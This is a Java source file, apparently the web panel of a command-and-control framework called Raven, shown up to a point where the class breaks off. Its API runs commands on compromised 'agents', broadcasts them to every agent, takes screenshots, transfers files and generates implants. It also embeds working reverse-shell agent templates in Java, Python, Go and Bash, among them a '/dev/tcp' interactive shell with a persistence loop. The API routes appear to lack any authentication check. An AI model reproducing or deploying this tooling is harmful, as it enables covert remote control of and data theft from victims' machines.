package com.raven.interfaces.APP;

import com.google.gson.Gson;
import com.raven.core.database.TeamDatabase;
import com.raven.core.event.EventManager.EventType;
import com.raven.core.output.Logger;
import com.raven.core.server.ListenerMode;
import com.raven.core.server.RavenServer;
import com.raven.core.session.Session;
import com.raven.utils.ServerConfig;
import com.sun.net.httpserver.*;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.*;

public final class WebApp {

    @FunctionalInterface
    interface RouteHandler {
        String Handle(HttpExchange E) throws Exception;
    }

    private final ServerConfig Config;
    private final ListenerMode ActiveMode;
    private final TeamDatabase Db;
    private final Gson GsonInst = new Gson();
    private final int MaxLogs;
    private final Path BaseDir;

    private boolean ServerOwned = false;
    private RavenServer Server;
    private HttpServer HttpSrv;
    private Instant ServerStartTime;

    private final List<String> Logs = new CopyOnWriteArrayList<>();
    private final java.util.concurrent.ConcurrentHashMap<String, String> ActiveTokens = new java.util.concurrent.ConcurrentHashMap<>();

    public WebApp(ServerConfig Config, ListenerMode Mode) {
        this.Config = Config;
        this.ActiveMode = Mode;
        this.MaxLogs = Config.GetMaxLogEntries();
        this.Db = TeamDatabase.Connect(Config);
        this.BaseDir = ResolveBaseDir();
    }

    private Path ResolveBaseDir() {
        Path Cwd = Paths.get("").toAbsolutePath();
        if (Files.exists(Cwd.resolve("config"))) return Cwd;
        try {
            Path Jar = Paths.get(WebApp.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getParent();
            for (Path P : new Path[] { Jar, Jar != null ? Jar.getParent() : null }) if (P != null && Files.exists(P.resolve("config"))) return P.toAbsolutePath();
        } catch (Exception Ignored) {}
        return Cwd;
    }

    private Path ResolvePath(String Rel) {
        Path Direct = Paths.get(Rel);
        if (Direct.isAbsolute() && Files.exists(Direct)) return Direct;
        Path FromBase = BaseDir.resolve(Rel);
        if (Files.exists(FromBase)) return FromBase;
        return Paths.get("").toAbsolutePath().resolve(Rel);
    }

    public void AttachServer(RavenServer ExistingServer, Instant StartTime) {
        this.Server = ExistingServer;
        this.ServerStartTime = StartTime;
        this.ServerOwned = false;
        Logger.Info("WebApp attached to existing RavenServer on " + ExistingServer.GetHost() + ":" + ExistingServer.GetPort());
    }

    public void Run(String Host, int Port) throws Exception {
        HttpSrv = HttpServer.create(new InetSocketAddress(Host, Port), 100);
        RegisterRoutes();
        HttpSrv.setExecutor(Executors.newFixedThreadPool(20));
        HttpSrv.start();
        Logger.Info("Web Panel Started On http://" + Host + ":" + Port);
        Logger.Info("Static Dir : " + ResolvePath(Config.GetStaticDir()));
        Logger.Info("Template Dir: " + ResolvePath(Config.GetTemplateDir()));
        AddLog("=".repeat(70));
        AddLog("RAVEN WEB PANEL INITIALIZED — MODE: " + ActiveMode.name());
        AddLog("=".repeat(70));

        if (Server == null) {
            Server = new RavenServer(Config.GetServerHost(), Config.GetServerPort(), ActiveMode, Config);
            Server.AddEventListener(this::OnEvent);
            boolean[] Started = Server.StartServer();
            if (Started[0]) {
                ServerOwned = true;
                ServerStartTime = Instant.now();
                Thread T = new Thread(Server::AcceptConnections, "AcceptConnections");
                T.setDaemon(true);
                T.start();
            } else {
                Logger.Warn("Agent server failed to start — web panel running in monitor-only mode");
            }
        }
    }

    private void RegisterRoutes() {
        HttpSrv.createContext("/api/auth/login", E -> Route(E, this::ApiAuthLogin));
        HttpSrv.createContext("/api/auth/logout", E -> Route(E, this::ApiAuthLogout));
        HttpSrv.createContext("/api/server/status", E -> Route(E, this::ApiStatus));
        HttpSrv.createContext("/api/server/start", E -> Route(E, this::ApiStart));
        HttpSrv.createContext("/api/server/stop", E -> Route(E, this::ApiStop));
        HttpSrv.createContext("/api/agents", E -> Route(E, this::ApiAgents));
        HttpSrv.createContext("/api/agents/kill", E -> Route(E, this::ApiKill));
        HttpSrv.createContext("/api/command/execute", E -> Route(E, this::ApiExec));
        HttpSrv.createContext("/api/command/broadcast", E -> Route(E, this::ApiBroadcast));
        HttpSrv.createContext("/api/command/broadcastall", E -> Route(E, this::ApiBroadcastAll));
        HttpSrv.createContext("/api/command/history", E -> Route(E, this::ApiCmdHist));
        HttpSrv.createContext("/api/sessions/history", E -> Route(E, this::ApiSessHist));
        HttpSrv.createContext("/api/logs", E -> Route(E, this::ApiLogs));
        HttpSrv.createContext("/api/logs/clear", E -> Route(E, this::ApiLogsClear));
        HttpSrv.createContext("/api/team/operators", E -> Route(E, this::ApiOperators));
        HttpSrv.createContext("/api/team/operators/create", E -> Route(E, this::ApiOpCreate));
        HttpSrv.createContext("/api/team/operators/delete", E -> Route(E, this::ApiOpDelete));
        HttpSrv.createContext("/api/team/operators/role", E -> Route(E, this::ApiOpRole));
        HttpSrv.createContext("/api/team/operators/password", E -> Route(E, this::ApiOpPassword));
        HttpSrv.createContext("/api/team/roles", E -> Route(E, this::ApiRoles));
        HttpSrv.createContext("/api/command/screenshot", E -> Route(E, this::ApiScreenshot));
        HttpSrv.createContext("/api/command/download", E -> Route(E, this::ApiDownload));
        HttpSrv.createContext("/api/command/upload", E -> Route(E, this::ApiUpload));
        HttpSrv.createContext("/api/agent/gen", E -> Route(E, this::ApiAgentGen));
        HttpSrv.createContext("/api/agent/list", E -> Route(E, this::ApiAgentList));
        HttpSrv.createContext("/api/team/operators/kick", E -> Route(E, this::ApiOpKick));
        HttpSrv.createContext("/static/", new StaticHandler());
        HttpSrv.createContext("/", new IndexHandler());
    }

    private void Route(HttpExchange E, RouteHandler H) {
        try {
            E.getResponseHeaders().add("Content-Type", "application/json");
            E.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
            E.getResponseHeaders().add("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
            E.getResponseHeaders().add("Access-Control-Allow-Headers", "Content-Type");
            if (E.getRequestMethod().equalsIgnoreCase("OPTIONS")) {
                E.sendResponseHeaders(200, -1);
                return;
            }
            byte[] Body = H.Handle(E).getBytes("UTF-8");
            E.sendResponseHeaders(200, Body.length);
            try (OutputStream O = E.getResponseBody()) {
                O.write(Body);
            }
        } catch (Exception Ex) {
            try {
                byte[] B = GsonInst.toJson(Map.of("Error", String.valueOf(Ex.getMessage()))).getBytes("UTF-8");
                E.sendResponseHeaders(500, B.length);
                try (OutputStream O = E.getResponseBody()) {
                    O.write(B);
                }
            } catch (IOException Ignored) {}
        }
    }

    private String ApiStatus(HttpExchange E) {
        boolean Up = Server != null && Server.IsRunning();
        Map<String, Object> R = new LinkedHashMap<>();
        R.put("Status", Up ? "Online" : "Offline");
        R.put("Mode", ActiveMode.name());
        R.put("Host", Up ? Server.GetHost() : Config.GetServerHost());
        R.put("Port", Up ? Server.GetPort() : Config.GetServerPort());
        R.put("StartedAt", ServerStartTime != null ? ServerStartTime.getEpochSecond() : 0);
        R.put("Uptime", Uptime());
        R.put("Agents", Up ? Server.GetSessions().Count() : 0);
        R.put("DbOnline", Db.IsConnected());
        R.put("DbType", Config.GetDatabaseType());
        if (Up) R.put("Key", Server.GetKeyBase64());
        return GsonInst.toJson(R);
    }

    private String ApiStart(HttpExchange E) throws Exception {
        if (Server != null && Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Already running"));
        Map<String, Object> B = Body(E);
        String Host = Str(B, "Host", Config.GetServerHost());
        int Port = Num(B, "Port", Config.GetServerPort());
        Server = new RavenServer(Host, Port, ActiveMode, Config);
        Server.AddEventListener(this::OnEvent);
        boolean[] R = Server.StartServer();
        if (!R[0]) {
            AddLog("Failed to start server");
            return GsonInst.toJson(Map.of("Error", "Failed to start server"));
        }
        ServerStartTime = Instant.now();
        AddLog("Server started on " + Host + ":" + Port);
        new Thread(Server::AcceptConnections, "AcceptConnections").start();
        return GsonInst.toJson(Map.of("Success", true, "Host", Host, "Port", Port, "Mode", ActiveMode.name(), "StartedAt", ServerStartTime.getEpochSecond()));
    }

    private String ApiStop(HttpExchange E) {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Not running"));
        Server.StopServer();
        Server = null;
        ServerStartTime = null;
        AddLog("Server stopped");
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiAgents(HttpExchange E) {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Agents", Collections.emptyList()));
        List<Map<String, Object>> List = new ArrayList<>();
        for (Session S : Server.GetSessions().GetAll()) {
            Map<String, Object> A = new LinkedHashMap<>();
            A.put("ID", S.GetId());
            A.put("Hostname", S.GetHostname());
            A.put("OS", S.GetOs());
            A.put("User", S.GetUser());
            A.put("Arch", S.GetArch());
            A.put("AgentIP", S.GetAgentIp());
            A.put("AgentName", S.GetAgentName());
            A.put("JoinedAt", S.GetJoinedAt());
            A.put("Type", S.GetSessionType().name());
            A.put("ShellMode", S.GetShellMode());
            A.put("Encrypted", S.IsEncrypted());
            A.put("MtlsEnabled", S.IsMtlsEnabled());
            A.put("Note", Db.GetAgentNote(S.GetId()));
            List.add(A);
        }
        return GsonInst.toJson(Map.of("Agents", List));
    }

    private String ApiKill(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        int Id = Num(Body(E), "AgentId", 0);
        if (Id == 0) return GsonInst.toJson(Map.of("Error", "AgentId required"));
        Server.RemoveSession(Id);
        AddLog("[KILL] Agent-" + Id);
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiExec(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> B = Body(E);
        int AgentId = Num(B, "AgentId", 0);
        String Command = Str(B, "Command", "");
        String Operator = Str(B, "Operator", "system");
        if (AgentId == 0 || Command.isEmpty()) return GsonInst.toJson(Map.of("Error", "AgentId and Command required"));
        AddLog("[>] [" + Operator + "] Agent-" + AgentId + " » " + Command);
        String[] R = Server.ExecuteCommand(AgentId, Command);
        boolean Ok = Boolean.parseBoolean(R[0]);
        Db.SaveCommandLog(AgentId, Operator, Command, R[1], Ok);
        AddLog(Ok ? "" + R[1] : "" + R[1]);
        return GsonInst.toJson(Map.of("Success", Ok, "Output", R[1], "Command", Command));
    }

    private String ApiBroadcast(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> B = Body(E);
        String Command = Str(B, "Command", "");
        String Operator = Str(B, "Operator", "system");
        @SuppressWarnings("unchecked")
        java.util.List<Object> Raw = (java.util.List<Object>) B.getOrDefault("AgentIds", new ArrayList<>());
        if (Command.isEmpty()) return GsonInst.toJson(Map.of("Error", "Command required"));
        java.util.List<Integer> Ids = new ArrayList<>();
        for (Object O : Raw) {
            try {
                Ids.add((int) Double.parseDouble(O.toString()));
            } catch (Exception Ign) {}
        }
        if (Ids.isEmpty()) return GsonInst.toJson(Map.of("Error", "AgentIds required"));
        AddLog("[BROADCAST] [" + Operator + "] → " + Ids.size() + " agents » " + Command);
        Map<Integer, String[]> Results = Server.BroadcastCommand(Ids, Command);
        Map<String, Object> Out = new LinkedHashMap<>();
        for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
            boolean Ok = Boolean.parseBoolean(En.getValue()[0]);
            Out.put(String.valueOf(En.getKey()), Map.of("Success", Ok, "Output", En.getValue()[1]));
            Db.SaveCommandLog(En.getKey(), Operator, Command, En.getValue()[1], Ok);
        }
        return GsonInst.toJson(Map.of("Success", true, "Results", Out, "Count", Results.size()));
    }

    private String ApiBroadcastAll(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> B = Body(E);
        String Command = Str(B, "Command", "");
        String Operator = Str(B, "Operator", "system");
        if (Command.isEmpty()) return GsonInst.toJson(Map.of("Error", "Command required"));
        AddLog("[BROADCAST-ALL] [" + Operator + "] → " + Server.GetSessions().Count() + " agents » " + Command);
        Map<Integer, String[]> Results = Server.BroadcastAll(Command);
        Map<String, Object> Out = new LinkedHashMap<>();
        for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
            boolean Ok = Boolean.parseBoolean(En.getValue()[0]);
            Out.put(String.valueOf(En.getKey()), Map.of("Success", Ok, "Output", En.getValue()[1]));
            Db.SaveCommandLog(En.getKey(), Operator, Command, En.getValue()[1], Ok);
        }
        return GsonInst.toJson(Map.of("Success", true, "Results", Out, "Count", Results.size()));
    }

    private String ApiCmdHist(HttpExchange E) throws Exception {
        Map<String, Object> B = Body(E);
        return GsonInst.toJson(Map.of("History", Db.GetCommandHistory(Num(B, "AgentId", 0), Num(B, "Limit", 100))));
    }

    private String ApiSessHist(HttpExchange E) throws Exception {
        return GsonInst.toJson(Map.of("Sessions", Db.GetSessionHistory(Num(Body(E), "Limit", 100))));
    }

    private String ApiLogs(HttpExchange E) {
        return GsonInst.toJson(Map.of("Logs", new ArrayList<>(Logs)));
    }

    private String ApiLogsClear(HttpExchange E) {
        Logs.clear();
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiOperators(HttpExchange E) {
        return GsonInst.toJson(Map.of("Operators", Db.GetOperators()));
    }

    private String ApiOpCreate(HttpExchange E) throws Exception {
        Map<String, Object> B = Body(E);
        String User = Str(B, "Username", "");
        String Pass = Str(B, "Password", "");
        String Role = Str(B, "Role", "MEMBER");
        if (User.isEmpty() || Pass.isEmpty()) return GsonInst.toJson(Map.of("Error", "Username and Password required"));
        if (Pass.length() < 8) return GsonInst.toJson(Map.of("Error", "Password must be at least 8 characters"));
        TeamDatabase.OperatorRole R = TeamDatabase.OperatorRole.FromString(Role);
        if (!Db.CreateOperator(User, TeamDatabase.HashPassword(Pass), R)) return GsonInst.toJson(Map.of("Error", "Username already exists"));
        AddLog("[TEAM] Operator created: " + User + " [" + R + "]");
        return GsonInst.toJson(Map.of("Success", true, "Username", User, "Role", R.name()));
    }

    private String ApiOpDelete(HttpExchange E) throws Exception {
        String User = Str(Body(E), "Username", "");
        if (User.isEmpty()) return GsonInst.toJson(Map.of("Error", "Username required"));
        if (User.equalsIgnoreCase(Config.GetAdminUsername())) return GsonInst.toJson(Map.of("Error", "Cannot delete admin"));
        boolean Del = Db.DeleteOperator(User);
        if (Del) AddLog("[TEAM] Operator deleted: " + User);
        return GsonInst.toJson(Map.of("Success", Del));
    }

    private String ApiOpRole(HttpExchange E) throws Exception {
        Map<String, Object> B = Body(E);
        String User = Str(B, "Username", "");
        String Role = Str(B, "Role", "");
        if (User.isEmpty() || Role.isEmpty()) return GsonInst.toJson(Map.of("Error", "Username and Role required"));
        if (User.equalsIgnoreCase(Config.GetAdminUsername())) return GsonInst.toJson(Map.of("Error", "Cannot change admin role"));
        TeamDatabase.OperatorRole R = TeamDatabase.OperatorRole.FromString(Role);
        Db.UpdateOperatorRole(User, R);
        AddLog("[TEAM] Role updated: " + User + " → " + R);
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiOpPassword(HttpExchange E) throws Exception {
        Map<String, Object> B = Body(E);
        String User = Str(B, "Username", "");
        String NewPass = Str(B, "Password", "");
        if (User.isEmpty() || NewPass.isEmpty()) return GsonInst.toJson(Map.of("Error", "Username and Password required"));
        if (NewPass.length() < 8) return GsonInst.toJson(Map.of("Error", "Password must be at least 8 characters"));
        boolean Ok = Db.UpdateOperatorPassword(User, TeamDatabase.HashPassword(NewPass));
        if (Ok) AddLog("[TEAM] Password changed: " + User);
        return GsonInst.toJson(Map.of("Success", Ok));
    }

    private String ApiRoles(HttpExchange E) {
        List<Map<String, Object>> Roles = new ArrayList<>();
        for (TeamDatabase.OperatorRole R : TeamDatabase.OperatorRole.values()) {
            Map<String, Object> M = new LinkedHashMap<>();
            M.put("Name", R.name());
            M.put("Permissions", R.PermissionString());
            M.put("CanExec", R.CanExecute());
            M.put("CanWrite", R.CanWrite());
            M.put("CanRead", R.CanRead());
            M.put("CanKill", R.CanKillSession());
            M.put("CanManage", R.CanManage());
            M.put("CanKick", R.CanKickOperator());
            Roles.add(M);
        }
        return GsonInst.toJson(Map.of("Roles", Roles));
    }

    private String ApiAuthLogin(HttpExchange E) throws Exception {
        Map<String, Object> B = Body(E);
        String User = Str(B, "Username", "");
        String Pass = Str(B, "Password", "");

        if (User.isEmpty() && Pass.isEmpty()) {
            return GsonInst.toJson(Map.of("Mode", "teamserver"));
        }

        if (!Db.ValidateOperator(User, TeamDatabase.HashPassword(Pass))) {
            return GsonInst.toJson(Map.of("Error", "Invalid credentials"));
        }
        Db.UpdateLastSeen(User);
        TeamDatabase.OperatorRole Role = Db.GetOperatorRole(User);

        String TokenRaw = User + ":" + Role.name() + ":" + System.currentTimeMillis();
        String Token = java.util.Base64.getEncoder().encodeToString(TokenRaw.getBytes("UTF-8"));
        ActiveTokens.put(Token, User);

        return GsonInst.toJson(Map.of("Token", Token, "Username", User, "Role", Role.name(), "Permissions", Role.PermissionString()));
    }

    private String ApiAuthLogout(HttpExchange E) throws Exception {
        String Auth = E.getRequestHeaders().getFirst("Authorization");
        if (Auth != null && Auth.startsWith("Bearer ")) {
            ActiveTokens.remove(Auth.substring(7));
        }
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiChatSend(HttpExchange E) throws Exception {
        Map<String, Object> B = Body(E);
        String From = Str(B, "From", "web");
        String To = Str(B, "To", "all");
        String Msg = Str(B, "Message", "");
        if (Msg.isEmpty()) return GsonInst.toJson(Map.of("Error", "Message required"));
        Db.SaveChatLog(From, To, Msg);
        AddLog("[CHAT] " + From + " → " + To + ": " + Msg);
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiChatHistory(HttpExchange E) throws Exception {
        int Limit = Num(Body(E), "Limit", 100);
        return GsonInst.toJson(Map.of("Chat", Db.GetChatLogs(Limit)));
    }

    private String ApiScreenshot(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> B = Body(E);
        int AgentId = Num(B, "AgentId", 0);
        String Operator = Str(B, "Operator", "system");
        if (AgentId == 0) return GsonInst.toJson(Map.of("Error", "AgentId required"));
        String[] R = Server.ExecuteCommand(AgentId, "screenshot");
        boolean Ok = Boolean.parseBoolean(R[0]);
        Db.SaveCommandLog(AgentId, Operator, "screenshot", R[1], Ok);
        AddLog("[SCREENSHOT] Agent-" + AgentId + " → " + (Ok ? "saved" : R[1]));
        return GsonInst.toJson(Map.of("Success", Ok, "Output", R[1]));
    }

    private String ApiDownload(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> B = Body(E);
        int AgentId = Num(B, "AgentId", 0);
        String Path = Str(B, "Path", "");
        String Operator = Str(B, "Operator", "system");
        if (AgentId == 0 || Path.isEmpty()) return GsonInst.toJson(Map.of("Error", "AgentId and Path required"));
        String[] R = Server.ExecuteCommand(AgentId, "download " + Path);
        boolean Ok = Boolean.parseBoolean(R[0]);
        Db.SaveCommandLog(AgentId, Operator, "download " + Path, R[1], Ok);
        AddLog("[DOWNLOAD] Agent-" + AgentId + " ← " + Path + (Ok ? " OK" : " FAILED"));
        return GsonInst.toJson(Map.of("Success", Ok, "Output", R[1], "Path", Path));
    }

    private String ApiUpload(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> B = Body(E);
        int AgentId = Num(B, "AgentId", 0);
        String LocalPath = Str(B, "LocalPath", "");
        String RemotePath = Str(B, "RemotePath", "");
        String Operator = Str(B, "Operator", "system");
        if (AgentId == 0 || LocalPath.isEmpty()) return GsonInst.toJson(Map.of("Error", "AgentId and LocalPath required"));
        String Cmd = RemotePath.isEmpty() ? "upload " + LocalPath : "upload " + LocalPath + " " + RemotePath;
        String[] R = Server.ExecuteCommand(AgentId, Cmd);
        boolean Ok = Boolean.parseBoolean(R[0]);
        Db.SaveCommandLog(AgentId, Operator, Cmd, R[1], Ok);
        AddLog("[UPLOAD] Agent-" + AgentId + " → " + LocalPath + (Ok ? " OK" : " FAILED"));
        return GsonInst.toJson(Map.of("Success", Ok, "Output", R[1]));
    }

    private String ApiOpKick(HttpExchange E) throws Exception {
        Map<String, Object> B = Body(E);
        String User = Str(B, "Username", "");
        if (User.isEmpty()) return GsonInst.toJson(Map.of("Error", "Username required"));
        if (User.equalsIgnoreCase(Config.GetAdminUsername())) return GsonInst.toJson(Map.of("Error", "Cannot kick admin"));
        if (Db.DeleteOperator(User)) return GsonInst.toJson(Map.of("Success", true, "Message", "Operator kicked: " + User));
        return GsonInst.toJson(Map.of("Error", "Operator not found: " + User));
    }

    private String ApiAgentGen(HttpExchange E) throws Exception {
        Map<String, Object> B = Body(E);
        String AgentId = Str(B, "AgentId", "agent-" + System.currentTimeMillis());
        String Host = Str(B, "Host", Config.GetServerHost());
        int Port = Num(B, "Port", Config.GetServerPort());
        boolean Mtls = Boolean.parseBoolean(Str(B, "Mtls", "false"));
        boolean Persist = Boolean.parseBoolean(Str(B, "Persist", "false"));
        boolean Hide = Boolean.parseBoolean(Str(B, "Hide", "false"));
        String Lang = Str(B, "Lang", "java").toLowerCase();
        try {
            com.raven.core.cryptography.CertificateManager Mgr = new com.raven.core.cryptography.CertificateManager(Config);
            Mgr.Initialize(Host);
            String CertPath = Mgr.CreateAgentCertificate(AgentId);
            String OutDir = "IMPLANT/" + AgentId.toUpperCase();
            java.nio.file.Files.createDirectories(java.nio.file.Paths.get(OutDir));
            java.nio.file.Files.copy(java.nio.file.Paths.get(CertPath), java.nio.file.Paths.get(OutDir + "/agent.p12"), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            java.nio.file.Files.copy(java.nio.file.Paths.get(Config.GetCaPath()), java.nio.file.Paths.get(OutDir + "/ca.p12"), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            String AgentSrc = com.raven.utils.AgentSourceGen.Generate(Lang, AgentId, Host, Port, Mtls, Persist, Hide);
            String SrcFile = OutDir + "/" + com.raven.utils.AgentSourceGen.Filename(Lang);
            java.nio.file.Files.writeString(java.nio.file.Paths.get(SrcFile), AgentSrc);
            java.nio.file.Files.writeString(java.nio.file.Paths.get(OutDir + "/README.txt"), "Agent — " + AgentId + "\n" + "Server  : " + Host + ":" + Port + "\n" + "MTLS    : " + Mtls + "\n" + "Lang    : " + Lang + "\n" + "Files   : agent.p12  ca.p12  agent." + LangExt(Lang) + "\n");
            AddLog("[AGENT-GEN] " + AgentId + " [" + Lang.toUpperCase() + "] → " + OutDir);
            return GsonInst.toJson(Map.of("Success", true, "AgentId", AgentId, "OutputDir", OutDir, "Lang", Lang, "Mtls", Mtls, "Files", java.util.List.of("agent.p12", "ca.p12", com.raven.utils.AgentSourceGen.Filename(Lang), "README.txt")));
        } catch (Exception Ex) {
            Logger.Error("AgentGen failed: " + Ex.getMessage());
            return GsonInst.toJson(Map.of("Error", "Agent generation failed: " + Ex.getMessage()));
        }
    }

    private String ApiAgentList(HttpExchange E) throws Exception {
        java.nio.file.Path Dir = java.nio.file.Paths.get("IMPLANT");
        if (!java.nio.file.Files.exists(Dir)) return GsonInst.toJson(Map.of("Agents", new ArrayList<>()));
        List<Map<String, Object>> Agents = new ArrayList<>();
        java.nio.file.Files.list(Dir).forEach(P -> {
            Map<String, Object> M = new LinkedHashMap<>();
            M.put("Id", P.getFileName().toString());
            M.put("Path", P.toString());
            M.put("Files", new java.io.File(P.toString()).list());
            Agents.add(M);
        });
        return GsonInst.toJson(Map.of("Agents", Agents));
    }

    private String GenerateAgentSource(String Lang, String Id, String Host, int Port, boolean Mtls, boolean Persist, boolean Hide) {
        return switch (Lang) {
            case "python" -> PythonAgent(Id, Host, Port, Mtls, Persist);
            case "go" -> GoAgent(Id, Host, Port, Mtls);
            case "bash" -> BashAgent(Id, Host, Port);
            default -> JavaAgent(Id, Host, Port, Mtls, Persist, Hide);
        };
    }

    private static String LangExt(String Lang) {
        return switch (Lang) {
            case "python" -> "py";
            case "go" -> "go";
            case "bash" -> "sh";
            default -> "java";
        };
    }

    private String JavaAgent(String Id, String Host, int Port, boolean Mtls, boolean Persist, boolean Hide) {
        String NL = "\n";
        return String.join(
            NL,
            "// Java Agent — " + Id,
            "// Auto-generated. Compile: javac RavenAgent.java && java RavenAgent",
            "// Requires: agent.p12, ca.p12 in working directory (only if MTLS=true)",
            "import java.io.*;",
            "import java.net.*;",
            "import java.security.KeyStore;",
            "import javax.net.ssl.*;",
            "",
            "public class RavenAgent {",
            "    static final String  HOST    = \"" + Host + "\";",
            "    static final int     PORT    = " + Port + ";",
            "    static final boolean MTLS    = " + Mtls + ";",
            "    static final boolean PERSIST = " + Persist + ";",
            "    static final String  KS_PASS = \"raven\";",
            "",
            "    public static void main(String[] A) throws Exception {",
            "        do {",
            "            try { run(); } catch (Exception E) { Thread.sleep(5000); }",
            "        } while (PERSIST);",
            "    }",
            "",
            "    static void run() throws Exception {",
            "        Socket S;",
            "        if (MTLS) {",
            "            KeyStore Ks = KeyStore.getInstance(\"PKCS12\");",
            "            Ks.load(new FileInputStream(\"agent.p12\"), KS_PASS.toCharArray());",
            "            KeyStore Ts = KeyStore.getInstance(\"PKCS12\");",
            "            Ts.load(new FileInputStream(\"ca.p12\"), KS_PASS.toCharArray());",
            "            KeyManagerFactory Km = KeyManagerFactory.getInstance(\"SunX509\");",
            "            Km.init(Ks, KS_PASS.toCharArray());",
            "            TrustManagerFactory Tm = TrustManagerFactory.getInstance(\"SunX509\");",
            "            Tm.init(Ts);",
            "            SSLContext Ctx = SSLContext.getInstance(\"TLS\");",
            "            Ctx.init(Km.getKeyManagers(), Tm.getTrustManagers(), null);",
            "            S = Ctx.getSocketFactory().createSocket(HOST, PORT);",
            "        } else {",
            "            S = new Socket(HOST, PORT);",
            "        }",
            "        InputStream  In  = S.getInputStream();",
            "        OutputStream Out = S.getOutputStream();",
            "        String Info = \"{\\\"Type\\\":\\\"RAVEN\\\",\\\"ID\\\":\\\"" + Id + "\\\",\\\"OS\\\":\\\"\"",
            "            + System.getProperty(\"os.name\")",
            "            + \"\\\",\\\"User\\\":\\\"\" + System.getProperty(\"user.name\")",
            "            + \"\\\",\\\"Hostname\\\":\\\"\" + InetAddress.getLocalHost().getHostName() + \"\\\"}\\n\";",
            "        Out.write(Info.getBytes(\"UTF-8\"));",
            "        BufferedReader R = new BufferedReader(new InputStreamReader(In));",
            "        PrintStream   P = new PrintStream(Out, true, \"UTF-8\");",
            "        String Cmd;",
            "        while ((Cmd = R.readLine()) != null) {",
            "            try {",
            "                Process Proc = Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",Cmd});",
            "                byte[] Buf = Proc.getInputStream().readAllBytes();",
            "                P.print(new String(Buf, \"UTF-8\"));",
            "                P.print(\"\\u0000\");",
            "                P.flush();",
            "            } catch (Exception Ex) {",
            "                P.print(\"ERROR: \" + Ex.getMessage() + \"\\u0000\");",
            "                P.flush();",
            "            }",
            "        }",
            "    }",
            "}"
        );
    }

    private String PythonAgent(String Id, String Host, int Port, boolean Mtls, boolean Persist) {
        String NL = "\n";
        return String.join(
            NL,
            "#!/usr/bin/env python3",
            "# Python Agent — " + Id,
            "import socket, subprocess, json, time, os, sys",
            "HOST, PORT, PERSIST = \"" + Host + "\", " + Port + ", " + Persist,
            "",
            "def run():",
            "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
            "    s.connect((HOST, PORT))",
            "    info = json.dumps({\"Type\":\"RAW\",\"ID\":\"" + Id + "\",\"OS\":sys.platform,",
            "                       \"User\":os.getenv(\"USER\",\"\"),\"Hostname\":socket.gethostname()})",
            "    s.sendall(info.encode() + b\"\\n\")",
            "    f = s.makefile(\"rwb\", buffering=0)",
            "    while True:",
            "        cmd = f.readline().decode().strip()",
            "        if not cmd: break",
            "        try:",
            "            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)",
            "            f.write(out + b\"\\x00\")",
            "        except Exception as e:",
            "            f.write(str(e).encode() + b\"\\x00\")",
            "",
            "while True:",
            "    try: run()",
            "    except: pass",
            "    if not PERSIST: break",
            "    time.sleep(5)"
        );
    }

    private String GoAgent(String Id, String Host, int Port, boolean Mtls) {
        String NL = "\n";
        return String.join(
            NL,
            "// Go Agent — " + Id,
            "// Build: go build -o agent agent.go",
            "package main",
            "",
            "import (",
            "    \"bufio\"",
            "    \"fmt\"",
            "    \"net\"",
            "    \"os\"",
            "    \"os/exec\"",
            "    \"strings\"",
            ")",
            "",
            "func main() {",
            "    for {",
            "        if err := run(); err != nil { continue }",
            "    }",
            "}",
            "",
            "func run() error {",
            "    conn, err := net.Dial(\"tcp\", \"" + Host + ":" + Port + "\")",
            "    if err != nil { return err }",
            "    defer conn.Close()",
            "    h, _ := os.Hostname()",
            "    u := os.Getenv(\"USER\")",
            "    fmt.Fprintf(conn, \"{\\\"Type\\\":\\\"RAW\\\",\\\"ID\\\":\\\"" + Id + "\\\",\\\"OS\\\":\\\"linux\\\",\\\"User\\\":\\\"%s\\\",\\\"Hostname\\\":\\\"%s\\\"}\\n\", u, h)",
            "    sc := bufio.NewScanner(conn)",
            "    for sc.Scan() {",
            "        cmd := strings.TrimSpace(sc.Text())",
            "        out, err := exec.Command(\"sh\", \"-c\", cmd).CombinedOutput()",
            "        if err != nil { out = append(out, []byte(err.Error())...) }",
            "        conn.Write(append(out, 0x00))",
            "    }",
            "    return nil",
            "}"
        );
    }

    private String BashAgent(String Id, String Host, int Port) {
        String NL = "\n";
        return String.join(NL, "#!/bin/bash", "# Bash Agent — " + Id, "HOST=\"" + Host + "\"", "PORT=" + Port, "while true; do", "    bash -i >& /dev/tcp/$HOST/$PORT 0>&1", "    sleep 5", "done");
    }

